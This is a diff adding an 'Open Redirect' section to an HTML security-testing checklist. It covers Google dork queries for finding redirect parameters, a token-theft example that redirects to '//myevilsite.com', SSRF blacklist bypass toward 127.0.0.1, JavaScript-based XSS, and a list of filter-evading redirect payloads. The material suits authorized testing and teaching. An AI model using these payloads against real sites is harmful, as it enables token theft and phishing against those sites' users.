@@ -885,7 +885,71 @@ x='''
             </ul>
         </div>
     </div>
-        
+    
+     <!-- Open Redirect Category -->
+        <div class="category">
+            <h3><input type="checkbox" id="open-redirect">2 > Open Redirect</h3>
+            <div class="subcategory">
+                <h4><input type="checkbox" id="what-are-open-redirects"> What Are Open Redirects?</h4>
+                <div class="steps">
+                    <p>Open redirects are URLs that redirect users from one site to another, such as <code>https://www.example.com/?go=https://www.google.com/</code>. They can redirect users from example.com to google.com.</p>
+                    <p>They typically involve parameters like <code>returnUrl</code> that redirect users after an action, such as logging in. These are often considered low impact but can be leveraged for SSRF attacks and other high-impact exploits.</p>
+                </div>
+                
+                <h4><input type="checkbox" id="finding-open-redirects"> Finding Open Redirects</h4>
+                <div class="steps">
+                    <p>Start with Google dorking using queries like:</p>
+                    <pre>inurl:go
+inurl:return
+inurl:r_url
+inurl:returnUrl
+inurl:returnUri
+inurl:locationUrl
+inurl:goTo
+inurl:return_url</pre>
+                    <p>Also explore parameters used in actions like login, logout, and signup. Check JavaScript files for redirect parameters.</p>
+                </div>
+                
+                <h4><input type="checkbox" id="using-open-redirects"> Using Open Redirects</h4>
+                <div class="steps">
+                    <h5>1. Grab Tokens via Misconfigured Apps/Login Flows</h5>
+                    <p>Example: <code>returnto=/supersecure</code> might redirect to <code>/supersecure?token=39e9334a</code>. Change to <code>returnto=//myevilsite.com</code> to steal tokens.</p>
+                    
+                    <h5>2. Bypassing Blacklists for SSRF/RCE</h5>
+                    <p>Use open redirects to bypass restrictions. Example: <code>?url=/example</code> can be pointed to <code>/redirect?goto=//127.0.0.1/</code>.</p>
+                    
+                    <h5>3. XSS via JavaScript</h5>
+                    <p>If redirection uses JavaScript, try:</p>
+                    <pre><script>
+top.location.href='reflectedhere';
+</script></pre>
+                    <p>Encode values correctly, using normal and double encoding:</p>
+                    <pre>https://example.com/login?return=https://example.com/?returnurl=https%3A%2F%2Fwww.google.com%2F
+https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Freturnurl%3Dhttps%253A%252F%252Fwww.google.com%252F</pre>
+                    
+                    <h5>Payloads</h5>
+                    <pre>\/yoururl.com 
+\/\/yoururl.com 
+\\yoururl.com 
+//yoururl.com 
+//theirsite@yoursite.com 
+/\/yoursite.com 
+https://yoursite.com%3F.theirsite.com/ 
+https://yoursite.com%2523.theirsite.com/ 
+https://yoursite?c=.theirsite.com/ 
+//%2F/yoursite.com 
+////yoursite.com 
+https://theirsite.computer/ 
+https://theirsite.com.mysite.com 
+/%0D/yoursite.com 
+/%2F/yoururl.com 
+/%5Cyoururl.com 
+//google%E3%80%82com</pre>
+                    <p>Use <a href="https://tools.intigriti.io/redirector/" target="_blank">this tool</a> to generate payloads.</p>
+                </div>
+            </div>
+        </div>
     </main>
 </body>
 </html>
+
